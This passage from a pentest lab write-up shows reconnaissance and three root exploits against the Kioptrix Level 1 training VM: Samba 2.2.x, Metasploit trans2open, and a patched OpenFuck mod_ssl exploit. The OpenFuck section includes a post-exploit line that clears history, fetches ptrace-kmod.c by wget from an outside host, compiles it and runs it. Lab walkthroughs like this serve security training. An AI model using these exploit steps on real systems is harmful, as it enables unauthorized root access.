</span><span class="go">   program vers proto   port</span>
<span class="hll"><span class="go">    100000    2   tcp    111  portmapper</span>
</span><span class="hll"><span class="go">    100000    2   udp    111  portmapper</span>
</span><span class="hll"><span class="go">    100024    1   udp  32768  status</span>
</span><span class="hll"><span class="go">    100024    1   tcp  32768  status</span>
</span></pre></div>
</div>
</div>
<div class="section" id="port-139-netbios-ssn-samba-smbd-workgroup-mygroup">
<h5>3.14.2.2.2.4. port 139: netbios-ssn Samba smbd (workgroup: MYGROUP)<a class="headerlink" href="#port-139-netbios-ssn-samba-smbd-workgroup-mygroup" title="Permalink to this headline">¶</a></h5>
<p>Run <code class="docutils literal notranslate"><span class="pre">smbclient</span></code> to determine the Samba 2.2.1a version:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$</span> smbclient -L <span class="nv">$T</span> -N
</span><span class="go">Anonymous login successful</span>
<span class="hll"><span class="go">Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]</span>
</span>
<span class="go">  Sharename       Type      Comment</span>
<span class="go">  ---------       ----      -------</span>
<span class="go">  IPC$            IPC       IPC Service (Samba Server)</span>
<span class="go">  ADMIN$          IPC       IPC Service (Samba Server)</span>
<span class="go">Anonymous login successful</span>
<span class="go">Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]</span>

<span class="go">  Server               Comment</span>
<span class="go">  ---------            -------</span>
<span class="go">  KIOPTRIX             Samba Server</span>

<span class="go">  Workgroup            Master</span>
<span class="go">  ---------            -------</span>
<span class="go">  MYGROUP              KIOPTRIX</span>
</pre></div>
</div>
<p><a class="reference external" href="https://www.exploit-db.com/search/?action=search&amp;text=samba&amp;e_author=&amp;platform=16&amp;type=3">Exploit Database search of samba for remote linux</a> got 21 hits of which 2 remote root exploits looked promising: <a class="reference external" href="https://www.exploit-db.com/exploits/10/">Samba &lt;= 2.2.8 - Remote Root Exploit</a> and <a class="reference external" href="https://www.exploit-db.com/exploits/16861/">Samba trans2open Overflow (Linux x86)</a> (for Metasploit). Two to ignore are <a class="reference external" href="https://www.exploit-db.com/exploits/55/">Samba 2.2.8 - (Bruteforce Method) Remote Root Exploit</a> (code was an erector set including 2 mains along with missing include’s) and <a class="reference external" href="https://www.exploit-db.com/exploits/7/">Samba 2.2.x - Remote Root Buffer Overflow Exploit</a> (simply didn’t work).</p>
<p>Alternatively we could have run <code class="docutils literal notranslate"><span class="pre">searchsploit</span> <span class="pre">samba</span></code> to get these same exploits:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$</span> searchsploit samba
</span><span class="go">--------------------------------------------- ---------------------------------- Description                                 |  Path</span>
<span class="go">--------------------------------------------- ----------------------------------</span>
<span class="go">Samba 2.2.x - Remote Root Buffer Overflow Ex | /linux/remote/7.pl</span>
<span class="hll"><span class="go">Samba &lt;= 2.2.8 - Remote Root Exploit         | /linux/remote/10.c</span>
</span><span class="go">Samba 2.2.8 (Bruteforce Method) Remote Root  | /linux/remote/55.c</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">--------------------------------------------- ----------------------------------</span>
</pre></div>
</div>
<p><a class="reference external" href="http://www.cvedetails.com/vulnerability-list/vendor_id-102/product_id-171/version_id-9501/Samba-Samba-2.2.1a.html">CVE Details Samba Samba 2.2.1.a Security Vulnerabilities</a> lists possible exploits.</p>
</div>
</div>
<div class="section" id="reconnaisance-on-ports-80-443">
<h4>3.14.2.2.3. Reconnaisance on ports 80 &amp; 443<a class="headerlink" href="#reconnaisance-on-ports-80-443" title="Permalink to this headline">¶</a></h4>
<div class="section" id="dirb">
<h5>3.14.2.2.3.1. dirb<a class="headerlink" href="#dirb" title="Permalink to this headline">¶</a></h5>
<p>First scan the web server with <strong class="program">dirb</strong>:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.102
<span class="nb">cd</span> <span class="nv">$PT</span>/spider
dirb  http://<span class="nv">$T</span>/ -o dirb.txt
</pre></div>
</div>
<p>The results of the scan were:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix1/spider$</span> cat dirb.txt
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="go">---- Scanning URL: http://192.168.1.102/ ----</span>
</span><span class="hll"><span class="go">+ http://192.168.1.102/cgi-bin/ (CODE:403|SIZE:272)</span>
</span><span class="hll"><span class="go">+ http://192.168.1.102/index.html (CODE:200|SIZE:2890)</span>
</span><span class="hll"><span class="go">==&gt; DIRECTORY: http://192.168.1.102/manual/</span>
</span><span class="hll"><span class="go">==&gt; DIRECTORY: http://192.168.1.102/mrtg/</span>
</span><span class="hll"><span class="go">==&gt; DIRECTORY: http://192.168.1.102/usage/</span>
</span><span class="hll"><span class="go">+ http://192.168.1.102/~operator (CODE:403|SIZE:273)</span>
</span><span class="hll"><span class="go">+ http://192.168.1.102/~root (CODE:403|SIZE:269)</span>
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
</pre></div>
</div>
</div>
<div class="section" id="nikto">
<h5>3.14.2.2.3.2. nikto<a class="headerlink" href="#nikto" title="Permalink to this headline">¶</a></h5>
<p>Next up was a <strong class="program">nikto</strong> scan:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.102
<span class="nb">cd</span> <span class="nv">$PT</span>/spider
nikto -output nikto.txt -host <span class="nv">$T</span> -port <span class="m">80</span>,443
</pre></div>
</div>
<p>The results of the scan were:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix1/spider$</span> cat nikto.txt
</span><span class="go">- Nikto v2.1.6/2.1.5</span>
<span class="go">+ Target Host: 192.168.1.102</span>
<span class="go">+ Target Port: 80</span>
<span class="go">+ GET Server leaks inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Wed Sep  5 20:12:46 2001</span>
<span class="go">+ GET The anti-clickjacking X-Frame-Options header is not present.</span>
<span class="go">+ OSVDB-637: GET Enumeration of users is possible by requesting ~username (responds with &#39;Forbidden&#39; for users, &#39;not found&#39; for non-existent users).</span>
<span class="go">+ OSVDB-27487: GET Apache is vulnerable to XSS via the Expect header</span>
<span class="go">+ HEAD Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.</span>
<span class="go">+ HEAD mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)</span>
<span class="go">+ HEAD OpenSSL/0.9.6b appears to be outdated (current is at least 1.0.1e). OpenSSL 0.9.8r is also current.</span>
<span class="go">+ OSVDB-838: GET Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.</span>
<span class="go">+ OSVDB-4552: GET Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.</span>
<span class="go">+ OSVDB-2733: GET Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.</span>
<span class="hll"><span class="go">+ GET mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. CVE-2002-0082, OSVDB-756.</span>
</span><span class="go">+ OPTIONS Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE</span>
<span class="go">+ OSVDB-877: TRACE HTTP TRACE method is active, suggesting the host is vulnerable to XST</span>
<span class="go">+ GET ///etc/hosts: The server install allows reading of any system file by adding an extra &#39;/&#39; to the URL.</span>
<span class="go">+ OSVDB-682: GET /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS). CA-2000-02.</span>
<span class="go">+ OSVDB-3268: GET /manual/: Directory indexing found.</span>
<span class="go">+ OSVDB-3092: GET /manual/: Web server manual found.</span>
<span class="go">+ OSVDB-3268: GET /icons/: Directory indexing found.</span>
<span class="go">+ OSVDB-3233: GET /icons/README: Apache default file found.</span>
<span class="go">+ OSVDB-3092: GET /test.php: This might be interesting...</span>
<span class="go">+ Target Host: 192.168.1.102</span>
<span class="go">+ Target Port: 443</span>
<span class="go">+ GET The site uses SSL and the Strict-Transport-Security HTTP header is not defined.</span>
<span class="go">+ GET Hostname &#39;192.168.1.102&#39; does not match certificate&#39;s CN &#39;localhost.localdomain/emailAddress=root@localhost.localdomain&#39;</span>
<span class="go">+ OSVDB-637: GET Enumeration of users is possible by requesting ~username (responds with &#39;Forbidden&#39; for users, &#39;not found&#39; for non-existent users).</span>
<span class="go">+ OSVDB-27487: GET Apache is vulnerable to XSS via the Expect header</span>
<span class="go">+ HEAD Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.</span>
<span class="go">+ HEAD mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)</span>
<span class="go">+ HEAD OpenSSL/0.9.6b appears to be outdated (current is at least 1.0.1e). OpenSSL 0.9.8r is also current.</span>
<span class="go">+ OSVDB-838: GET Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.</span>
<span class="go">+ OSVDB-4552: GET Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.</span>
<span class="go">+ OSVDB-2733: GET Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.</span>
<span class="go">+ GET mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. CVE-2002-0082, OSVDB-756.</span>
<span class="go">+ OPTIONS Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE</span>
<span class="go">+ OSVDB-877: TRACE HTTP TRACE method is active, suggesting the host is vulnerable to XST</span>
<span class="go">+ GET ///etc/hosts: The server install allows reading of any system file by adding an extra &#39;/&#39; to the URL.</span>
<span class="go">+ OSVDB-682: GET /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS). CA-2000-02.</span>
<span class="go">+ OSVDB-3092: GET /manual/: Web server manual found.</span>
<span class="go">+ OSVDB-3268: GET /icons/: Directory indexing found.</span>
<span class="go">+ OSVDB-3233: GET /icons/README: Apache default file found.</span>
<span class="go">+ OSVDB-3092: GET /test.php: This might be interesting...</span>
</pre></div>
</div>
<p>The most promising result unfortunately had no ready exploit available online: mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell (CVE-2002-0082, OSVDB-756).</p>
</div>
</div>
</div>
</div>
<div class="section" id="the-exploits">
<h2>3.14.3. The Exploits<a class="headerlink" href="#the-exploits" title="Permalink to this headline">¶</a></h2>
<p>Some challenges exploit misconfiguration, but this one appears to rely on old, vulnerable software. Reconnaissance identified an number of possible exploits and we illustrate a few of them here.</p>
<div class="section" id="id23">
<h3>3.14.3.1. Samba &lt;= 2.2.8 - Remote Root Exploit<a class="headerlink" href="#id23" title="Permalink to this headline">¶</a></h3>
<p>The best exploit option appears to be <a class="reference external" href="https://www.exploit-db.com/exploits/10/">Samba &lt;= 2.2.8 - Remote Root Exploit</a>. Here’s the exploit:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$PT</span>/exploit
<span class="c1"># Kali source at /usr/share/exploitdb/platforms/linux/remote/10.c has format issues:</span>
<span class="c1">#   (1) CRLF line endings which can be fixed by running &quot;dos2unix 10.c&quot;</span>
<span class="c1">#   (2) Single lines split in two, giving the compiler fits. Hand-edit to fix those.</span>
<span class="c1"># OR instead pull it down from exploit-db (much easier):</span>
curl --silent --output <span class="m">10</span>.c https://www.exploit-db.com/download/10
dos2unix <span class="m">10</span>.c
gcc <span class="m">10</span>.c -o exploit10
./exploit10 -v -b <span class="m">0</span> <span class="nv">$T</span>
</pre></div>
</div>
<p>Running this gives us our root exploit:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/kioptrix1$ cd $</span>PT/exploit
<span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$ #</span> Kali <span class="nb">source</span> at /usr/share/exploitdb/platforms/linux/remote/10.c has format issues:
<span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$ #</span>   <span class="o">(</span><span class="m">1</span><span class="o">)</span> CRLF line endings which can be fixed by running <span class="s2">&quot;dos2unix 10.c&quot;</span>
<span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$ #</span>   <span class="o">(</span><span class="m">2</span><span class="o">)</span> Single lines split in two, giving the compiler fits. Hand-edit to fix those.
<span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$ #</span> OR instead pull it down from exploit-db <span class="o">(</span>much easier<span class="o">)</span>:
<span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$</span> curl --silent --output <span class="m">10</span>.c https://www.exploit-db.com/download/10
<span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$</span> dos2unix <span class="m">10</span>.c
<span class="go">dos2unix: converting file 10.c to Unix format ...</span>
<span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$</span> gcc <span class="m">10</span>.c -o exploit10
<span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$</span> ./exploit10 -v -b <span class="m">0</span> <span class="nv">$T</span>
<span class="go">samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)</span>
<span class="go">--------------------------------------------------------------</span>
<span class="go">+ Verbose mode.</span>
<span class="go">+ Bruteforce mode. (Linux)</span>
<span class="go">+ Host is running samba.</span>
<span class="go">+ Using ret: [0xbffffed4]</span>
<span class="go">+ Using ret: [0xbffffda8]</span>
<span class="go">+ Using ret: [0xbffffc7c]</span>
<span class="go">+ Using ret: [0xbffffb50]</span>
<span class="go">+ Worked!</span>
<span class="go">--------------------------------------------------------------</span>
<span class="go">*** JE MOET JE MUIL HOUWE</span>
<span class="go">Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown</span>
<span class="go">uid=0(root) gid=0(root) groups=99(nobody)</span>
<span class="go">bash -i</span>
<span class="go">bash: no job control in this shell</span>
<span class="gp">[root@kioptrix tmp]#</span> id
<span class="go">id</span>
<span class="go">uid=0(root) gid=0(root) groups=99(nobody)</span>
<span class="gp">[root@kioptrix tmp]#</span> uname -a
<span class="go">uname -a</span>
<span class="go">Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown</span>
<span class="gp">[root@kioptrix tmp]#</span> hostname
<span class="go">hostname</span>
<span class="go">kioptrix.level1</span>
<span class="gp">[root@kioptrix tmp]#</span> <span class="nb">exit</span>
<span class="go">exit</span>
<span class="go">exit</span>
<span class="go">exit</span>
<span class="go">exit</span>
<span class="go">exit</span>
<span class="go">Connection lost.</span>

<span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$</span>
</pre></div>
</div>
<p>And so we have root.</p>
</div>
<div class="section" id="id25">
<h3>3.14.3.2. Samba trans2open Overflow (Linux x86)<a class="headerlink" href="#id25" title="Permalink to this headline">¶</a></h3>
<p>This option uses the Megasploit Framework. See <a class="reference external" href="http://docs.kali.org/general-use/starting-metasploit-framework-in-kali">Kali Linux Official Documentation - Metasploit Framework</a> for starting the necessary services. Here’s the exploit:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
<span class="nv">$SUDO</span> service postgresql start
<span class="nv">$SUDO</span> service metasploit start
<span class="nv">$SUDO</span> msfconsole
</pre></div>
</div>
<p>Then in the msfconsole:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>db_status
vulns --info --search trans2open
use exploit/linux/samba/trans2open
<span class="nb">set</span> RHOST <span class="m">192</span>.168.1.102
exploit
</pre></div>
</div>
<p>Running the above shows you get root:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$ $</span>SUDO msfconsole
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">msf &gt; db_status</span>
<span class="go">[*] postgresql connected to msf3</span>
<span class="go">msf &gt; vulns --info --search trans2open</span>
<span class="go">[*] Time: 2015-06-28 18:46:39 UTC Vuln: host=192.168.1.102 name=Samba trans2open Overflow (Linux x86) refs=URL-http://seclists.org/bugtraq/2003/Apr/103,URL-http://seclists.org/bugtraq/2003/Apr/103,BID-7294,BID-7294,OSVDB-4469,OSVDB-4469,CVE-2003-0201 info=Exploited by exploit/linux/samba/trans2open to create Session 1</span>
<span class="go">msf &gt; use exploit/linux/samba/trans2open</span>
<span class="go">msf exploit(trans2open) &gt; set RHOST 192.168.1.102</span>
<span class="go">RHOST =&gt; 192.168.1.102</span>
<span class="go">msf exploit(trans2open) &gt; exploit</span>

<span class="go">[*] Started reverse handler on 192.168.1.104:4444</span>
<span class="go">[*] Trying return address 0xbffffdfc...</span>
<span class="go">[*] Trying return address 0xbffffcfc...</span>
<span class="go">[*] Trying return address 0xbffffbfc...</span>
<span class="go">[*] Trying return address 0xbffffafc...</span>
<span class="go">[*] Command shell session 1 opened (192.168.1.104:4444 -&gt; 192.168.1.102:32770) at 2015-06-28 11:49:46 -0700</span>

<span class="go">bash -i</span>
<span class="go">bash: no job control in this shell</span>
<span class="gp">[root@kioptrix tmp]#</span> id
<span class="go">id</span>
<span class="go">uid=0(root) gid=0(root) groups=99(nobody)</span>
<span class="gp">[root@kioptrix tmp]#</span> uname -a
<span class="go">uname -a</span>
<span class="go">Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown</span>
<span class="gp">[root@kioptrix tmp]#</span> hostname
<span class="go">hostname</span>
<span class="go">kioptrix.level1</span>
<span class="gp">[root@kioptrix tmp]#</span> <span class="nb">exit</span>
<span class="go">exit</span>
<span class="go">exit</span>
<span class="go">exit</span>

<span class="go">[*] 192.168.1.102 - Command shell session 1 closed.  Reason: Died from EOFError</span>

<span class="go">msf exploit(trans2open) &gt; exit</span>
</pre></div>
</div>
<p>And so we have root. Cleanup with:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">$SUDO</span> service metasploit stop
<span class="nv">$SUDO</span> service postgresql stop
</pre></div>
</div>
</div>
<div class="section" id="id26">
<h3>3.14.3.3. Apache OpenSSL - Remote Exploit<a class="headerlink" href="#id26" title="Permalink to this headline">¶</a></h3>
<p><a class="reference external" href="https://www.exploit-db.com/exploits/764/">Apache OpenSSL - Remote Exploit</a> gets root but requires <strong class="program">gcc</strong> on kioptrix1. It can be exploited as follows (following <a class="reference external" href="http://chousensha.github.io/blog/2014/06/12/pentest-lab-kioptrix-level-1/">Pentest lab - Kioptrix Level 1</a>). It’s relatively difficult to get working due to a couple of problems in the source code 764.c:</p>
<ul class="simple">
<li>Missing includes: “#include &lt;openssl/rc4.h&gt;”, “#include &lt;openssl/md5.h&gt;”</li>
<li>The “wget …” URL needs to be updated to “wget <a class="reference external" href="https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c">https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</a>”</li>
<li>get_server_hello declaration “unsigned char *p, *end;” changed to “const …”.</li>
</ul>
<p>The code is set to work for a fixed number of offsets so you run <code class="docutils literal notranslate"><span class="pre">./exploit764</span></code> to view the possible offsets to try, then <code class="docutils literal notranslate"><span class="pre">./exploit764</span> <span class="pre">OFFSET</span> <span class="pre">$T</span> <span class="pre">443</span></code> to run try a particular offset. Here we have the choice of 0x6a (doesn’t work) and 0x6b (does work).</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.102
<span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix1
<span class="nb">cd</span> <span class="nv">$PT</span>/exploit
curl --silent --output <span class="m">764</span>.c https://www.exploit-db.com/download/764
dos2unix <span class="m">764</span>.c
<span class="c1"># mods to 764.c</span>
<span class="c1">#   add missing includes</span>
sed -i <span class="s1">&#39;/^#include &lt;openssl\/evp.h&gt;$/a\</span>
<span class="s1">#include &lt;openssl/rc4.h&gt;\</span>
<span class="s1">#include &lt;openssl/md5.h&gt;&#39;</span> <span class="m">764</span>.c
sed -i <span class="s1">&#39;s|http://packetstormsecurity.nl/0304-exploits/ptrace-kmod.c|https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c|&#39;</span> <span class="m">764</span>.c
sed -i <span class="s1">&#39;s/\(unsigned char \*p, \*end;\)/const \1/&#39;</span> <span class="m">764</span>.c
gcc <span class="m">764</span>.c -o exploit764 -lcrypto
<span class="c1"># check for redhat offsets in apache 1.3.20</span>
./exploit764 <span class="p">|</span> grep -i redhat <span class="p">|</span> grep <span class="m">1</span>.3.20
<span class="c1"># 0x6a fails, 0x6b works</span>
./exploit764 0x6b <span class="nv">$T</span> <span class="m">443</span>
</pre></div>
</div>
<p>Running this gives us our root exploit:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$</span> <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.102
<span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$ PT=$</span>HOME/pentest/kioptrix1
<span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$ cd $</span>PT/exploit
<span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$</span> curl --silent --output <span class="m">764</span>.c https://www.exploit-db.com/download/764
<span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$</span> dos2unix <span class="m">764</span>.c
<span class="go">dos2unix: converting file 764.c to Unix format ...</span>
<span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$ #</span> mods to <span class="m">764</span>.c
<span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$ #</span>   add missing includes
<span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$</span> sed -i <span class="s1">&#39;/^#include &lt;openssl\/evp.h&gt;$/a\&gt; #include &lt;openssl/rc4.h&gt;\</span>
<span class="s1">&gt; #include &lt;openssl/md5.h&gt;&#39;</span> <span class="m">764</span>.c
<span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$</span> sed -i <span class="s1">&#39;s|http://packetstormsecurity.nl/0304-exploits/ptrace-kmod.c|https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c|&#39;</span> <span class="m">764</span>.c
<span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$</span> sed -i <span class="s1">&#39;s/\(unsigned char \*p, \*end;\)/const \1/&#39;</span> <span class="m">764</span>.c
<span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$</span> gcc <span class="m">764</span>.c -o exploit764 -lcrypto
<span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$ #</span> check <span class="k">for</span> redhat offsets in apache <span class="m">1</span>.3.20
<span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$</span> ./exploit764 <span class="p">|</span> grep -i redhat <span class="p">|</span> grep <span class="m">1</span>.3.20
<span class="go">        0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1</span>
<span class="go">        0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2</span>
<span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$ #</span> 0x6a fails, 0x6b works
<span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$</span> ./exploit764 0x6b <span class="nv">$T</span> <span class="m">443</span>

<span class="go">*******************************************************************</span>
<span class="go">* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *</span>
<span class="go">*******************************************************************</span>
<span class="go">* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *</span>
<span class="go">* #hackarena  irc.brasnet.org                                     *</span>
<span class="go">* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *</span>
<span class="go">* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span>
<span class="go">* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</span>
<span class="go">*******************************************************************</span>

<span class="go">Establishing SSL connection</span>
<span class="go">cipher: 0x4043808c   ciphers: 0x80f8068</span>
<span class="go">Ready to send shellcode</span>
<span class="go">Spawning shell...</span>
<span class="go">bash: no job control in this shell</span>
<span class="go">bash-2.05$</span>
<span class="go">bash-2.05$ unset HISTFILE; cd /tmp; wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p;</span>
<span class="go">--21:53:33--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</span>
<span class="go">           =&gt; `ptrace-kmod.c&#39;</span>
<span class="go">Connecting to dl.packetstormsecurity.net:443... connected!</span>
<span class="go">HTTP request sent, awaiting response... 200 OK</span>
<span class="go">Length: 3,921 [text/x-csrc]</span>

<span class="go">    0K ...                                                   100% @   1.25 MB/s</span>

<span class="go">21:53:34 (765.82 KB/s) - `ptrace-kmod.c&#39; saved [3921/3921]</span>

<span class="go">[+] Attached to 986</span>
<span class="go">[+] Waiting for signal</span>
<span class="go">[+] Signal caught</span>
<span class="go">[+] Shellcode placed at 0x4001189d</span>
<span class="go">[+] Now wait for suid shell...</span>
<span class="go">id</span>
<span class="go">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)</span>
<span class="go">uname -a</span>
<span class="go">Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown</span>
<span class="go">hostname</span>
<span class="go">kioptrix.level1</span>
<span class="go">ls -l</span>
<span class="go">total 21</span>
<span class="go">-rwsr-sr-x    1 root     root        19920 Jun 26 21:53 p</span>
<span class="go">rm p</span>
</pre></div>
</div>
<p>And so we have root.</p>
</div>
</div>
</div>


           </div>
           
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="security_shepherd.html" class="btn btn-neutral float-right" title="3.15. Security Shepherd Web App Levels" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
      
      
        <a href="kioptrix2.html" class="btn btn-neutral" title="3.13. Kioptrix Level 2" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <p>
        &copy; Copyright 2017, bitbender.

    </p>
  </div>
  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/rtfd/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  


  

    <script type="text/javascript">
        var DOCUMENTATION_OPTIONS = {
            URL_ROOT:'../',
            VERSION:'1.0.3',
            LANGUAGE:'None',
            COLLAPSE_INDEX:false,
            FILE_SUFFIX:'.html',
            HAS_SOURCE:  true,
            SOURCELINK_SUFFIX: '.txt'
        };
    </script>
      <script type="text/javascript" src="../_static/jquery.js"></script>
      <script type="text/javascript" src="../_static/underscore.js"></script>
      <script type="text/javascript" src="../_static/doctools.js"></script>
      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

  

  
  
    <script type="text/javascript" src="../_static/js/theme.js"></script>
  

  <script type="text/javascript">
      jQuery(function () {
          
          SphinxRtdTheme.Navigation.enableSticky();
          
      });
  </script> 

</body>
</html>